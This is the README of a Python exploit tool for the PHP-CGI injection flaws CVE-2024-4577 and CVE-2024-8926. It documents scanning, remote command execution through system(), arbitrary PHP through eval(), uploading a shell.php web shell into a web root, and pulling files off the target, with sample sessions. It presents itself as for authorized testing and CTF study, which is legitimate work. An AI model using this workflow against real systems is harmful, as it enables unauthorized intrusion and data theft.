# PHP-CGI Injector

English | [繁體中文](./README.zh-Hant.md)

🚀 **CVE-2024-4577 & CVE-2024-8926 Exploit Tool**

> An automated testing tool for **PHP-CGI parameter injection vulnerabilities**, supporting **CVE-2024-4577** and **CVE-2024-8926**. Capable of executing commands, uploading files, downloading files, etc.

---

## Introduction
This tool is designed to test **parameter injection vulnerabilities in PHP-CGI environments** and provides:
- ✅ Automated vulnerability scanning
- ✅ Multiple attack modes
- ✅ Support for `system()` command execution
- ✅ Support for arbitrary code execution via `eval()`
- ✅ File upload and download capabilities
- ✅ Automatic logging of executed commands (`--log`)
- ✅ Auto conversion of output encoding to prevent garbled text

---

## Disclaimer
**This tool is intended solely for legal testing and academic purposes. Unauthorized use on systems not permitted by the owner is prohibited!**
> **⚠️ Illegal use will be held accountable under law!**

This tool is exclusively for:
- 🔹 Enterprise penetration testing (Red Team)
- 🔹 CTF security research
- 🔹 Personal security learning

---

## Installation Dependencies
The tool relies on the following Python packages. Please install them first:
```bash
pip install -r requirements.txt
```
Or manually install:
```bash
pip install requests urllib3 chardet
```

---

## Usage Instructions
```bash
python exploit.py -u <target_url> [--timeout=sec] [--log]
```
Example:
```bash
python exploit.py -u http://example.com --timeout=30 --log
```

### Parameter Options
| Parameter | Description | Example |
|-----------|-------------|---------|
| `-u`      | Specify the target URL | `-u http://example.com` |
| `--timeout=sec` | Set request timeout (`1-120` seconds), `0` for infinite wait | `--timeout=30` |
| `--log`   | Enable automatic logging in Shell mode | `--log` |

---

## Operation Modes
Once the script identifies a vulnerability, it will display a menu:
```
[+] Vulnerable entry point found:: /php-cgi/php-cgi.exe (Vulnerability: CVE-2024-4577)

[*] Current target: http://example.com/ (Vulnerability: CVE-2024-4577)
Choose mode:
1) Shell Mode (Execute commands using system())
2) Custom PHP Mode (Execute arbitrary code using eval())
3) Upload File
4) Download File
5) Switch Attack Target
6) Exit Program
```

---

## Detailed Modes Explanation

### 1️⃣ Shell Mode
Execute **system commands**:
```shell
shell> whoami
```
📂 **Save output**
```shell
shell> whoami --save
```
```shell
shell> whoami --save C:\output\whoami.txt
```

---

### 2️⃣ Custom PHP Mode
Execute **custom PHP code**:
```php
phpinfo();
EOF
```
📂 **Save output**
```php
phpinfo();
EOF --save
```
```php
phpinfo();
EOF --save C:\output\info.html
```

---

### 3️⃣ Upload File
Local file path: `C:\test\shell.php`  
Target full path:
[*] Upload path set automatically to: `C:/xampp/htdocs/shell.php`

📂 **Manually specify the target path**
```plaintext
Target full path: C:\xampp\php\shell.php
```

---

### 4️⃣ Download File
Remote file path: `C:\xampp\htdocs\index.php`  
📂 **Files are saved in `download/`, and duplicates will be automatically numbered**  
```plaintext
[*] Downloaded to download/index.php
```

---

### 5️⃣ Switch Attack Target
Enter new target URL: `http://newtarget.com`  
🔹 **Will retest the vulnerability**

---

### 6️⃣ Exit Program
```plaintext
[*] Program ended
```

